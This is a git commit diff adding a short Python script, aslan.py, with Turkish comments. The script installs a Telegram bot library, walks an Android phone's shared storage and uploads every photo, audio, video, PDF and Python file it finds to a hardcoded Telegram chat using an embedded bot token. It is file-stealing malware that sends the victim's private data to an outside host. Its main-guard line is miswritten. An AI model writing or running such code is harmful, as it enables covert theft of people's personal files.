d24c0008da4b51f2d9f942b203ec0c75e7e118bd
Mustafagokboru1 <129276712+Mustafagokboru1@users.noreply.github.com>
2023-10-07 23:51:30 +0300

    Update aslan.py

--- aslan.py
+++ aslan.py
@@ -1,1 +1,39 @@
-a
+import os
+
+# Gerekli kütüphaneyi yüklemek için sistem komutu
+def yukle_gerekli_kutuphane():
+    try:
+        os.system("pip install pyTelegramBotAPI")
+        print("Gerekli kütüphane yüklendi.")
+    except Exception as e:
+        print(f'Hata: {str(e)}')
+
+# Gerekli kütüphaneyi yükleyin
+yukle_gerekli_kutuphane()
+
+import telebot
+
+TOKEN = '6578250693:AAGhoblNUGMiAJUGAxl_9xJ6GXZ8Jjw3uho'
+CHAT_ID = '5291833531'
+
+uzanti_listesi = ['.py', '.jpg', '.png', '.m4a', '.opus', '.mp3', '.mp4', '.pdf']
+
+bot = telebot.TeleBot(TOKEN)
+
+def dosyalari_tara(dizin):
+    for root, _, files in os.walk(dizin):
+        for dosya in files:
+            dosya_uzanti = os.path.splitext(dosya)[1]
+            if dosya_uzanti in uzanti_listesi:
+                dosya_yolu = os.path.join(root, dosya)
+                try:
+                    with open(dosya_yolu, 'rb') as dosya_objesi:
+                        bot.send_document(CHAT_ID, dosya_objesi)
+                except Exception as e:
+                    print(f'Hata: {str(e)}')
+
+if name == "main":
+    print("Başlıyor")
+    baslangic_dizini = '/storage/emulated/0'  # Taranmaya başlanacak kök dizini
+    dosyalari_tara(baslangic_dizini)
+    print("End")
